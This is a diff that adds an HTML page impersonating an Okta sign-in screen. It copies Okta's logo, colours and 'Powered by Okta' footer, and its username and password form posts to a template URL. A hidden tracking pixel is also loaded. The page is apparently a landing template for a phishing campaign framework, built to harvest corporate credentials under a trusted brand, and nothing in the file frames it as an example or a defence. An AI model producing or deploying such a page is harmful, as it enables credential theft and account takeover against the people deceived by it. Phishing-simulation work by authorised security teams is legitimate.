@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Sign In</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .okta-container { width: 400px; background: #fff; border-radius: 6px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); padding: 40px 32px; }
+        .okta-logo { text-align: center; margin-bottom: 32px; }
+        .okta-logo svg { width: 80px; height: 28px; }
+        h1 { font-size: 20px; font-weight: 400; color: #1d1d21; text-align: center; margin-bottom: 24px; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-size: 13px; font-weight: 600; color: #6e6e78; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .form-group input { width: 100%; padding: 10px 14px; border: 1px solid #c7c7c7; border-radius: 4px; font-size: 14px; outline: none; transition: border-color 0.2s; }
+        .form-group input:focus { border-color: #007dc1; box-shadow: 0 0 0 1px #007dc1; }
+        .checkbox-group { display: flex; align-items: center; margin-bottom: 20px; }
+        .checkbox-group input { margin-right: 8px; }
+        .checkbox-group label { font-size: 14px; color: #1d1d21; cursor: pointer; }
+        .submit-btn { width: 100%; background: #007dc1; color: #fff; border: none; padding: 12px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+        .submit-btn:hover { background: #006ba1; }
+        .divider { text-align: center; margin: 20px 0; position: relative; }
+        .divider::before { content: ''; position: absolute; top: 50%; left: 0; right: 0; border-top: 1px solid #e8e8e8; }
+        .divider span { background: #fff; padding: 0 12px; font-size: 12px; color: #6e6e78; position: relative; text-transform: uppercase; }
+        .help-links { text-align: center; margin-top: 16px; }
+        .help-links a { font-size: 13px; color: #007dc1; text-decoration: none; margin: 0 8px; }
+        .help-links a:hover { text-decoration: underline; }
+        .footer { margin-top: 24px; text-align: center; font-size: 12px; color: #a7a7a7; }
+        @media (max-width: 480px) { .okta-container { width: 100%; min-height: 100vh; border-radius: 0; box-shadow: none; } }
+    </style>
+</head>
+<body>
+    <div class="okta-container">
+        <div class="okta-logo">
+            <svg viewBox="0 0 80 28" xmlns="http://www.w3.org/2000/svg"><text x="0" y="22" font-family="Arial" font-size="24" font-weight="bold" fill="#007dc1">okta</text></svg>
+        </div>
+        <h1>Sign In</h1>
+        <form action="{{.URL}}" method="POST">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" placeholder="Username" required autofocus>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+            </div>
+            <div class="checkbox-group">
+                <input type="checkbox" id="remember" name="remember">
+                <label for="remember">Remember me</label>
+            </div>
+            <button type="submit" class="submit-btn">Sign In</button>
+            <div class="divider"><span>OR</span></div>
+            <div class="help-links">
+                <a href="#">Forgot password?</a>
+                <a href="#">Help</a>
+            </div>
+        </form>
+    </div>
+    <div class="footer">Powered by Okta</div>
+    <img src="{{.Tracker}}" style="display:none" alt="">
+</body>
+</html>
